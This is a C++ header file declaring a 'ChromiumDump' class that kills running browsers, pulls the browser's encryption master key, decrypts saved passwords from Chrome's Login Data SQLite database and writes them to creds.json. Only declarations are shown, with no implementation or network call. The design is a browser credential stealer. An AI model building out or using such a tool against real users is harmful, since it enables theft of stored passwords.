#pragma once
#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <wincrypt.h>
#include <bcrypt.h>
#include <ntstatus.h>
#include "json.hpp"
#include "sqlite3.h"
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Bcrypt.lib")
using json = nlohmann::json;
using namespace std;
#define AES_KEY_BYTES 32

class ChromiumDump {
	private:
		// data
		const BYTE v10[3] = { 'v', '1', '0' };
		DATA_BLOB masterKey;
		wstring browserExeName;
		string browserNickName;
		wstring browserDataPath;
		wstring localStatePath;
		wstring loginDataPath;
		json jsonData;
		sqlite3* db;
		bool killBrowsers;
		// functions
		bool TerminateBrowsers(std::vector<wstring>);
		bool GetBrowserPaths(wstring userProfile = L"Default");
		DATA_BLOB PullMasterKey();
		string DecryptPassword(LPCVOID pEncryptedPass, DWORD dwLenEncryptedPass, BYTE key[]);
		bool LoadSqliteDb(wstring path);
		bool UnloadSqliteDb();
		bool ParseSqliteDb();

	public:
		// data
		// functions
		ChromiumDump(wstring browserDataPath = L"Google\\Chrome\\User Data", wstring browserExeName = L"chrome.exe", bool killBrowsers = true);
		bool DumpPasswordData();
		bool WriteJSON(wstring path = L"creds.json");
};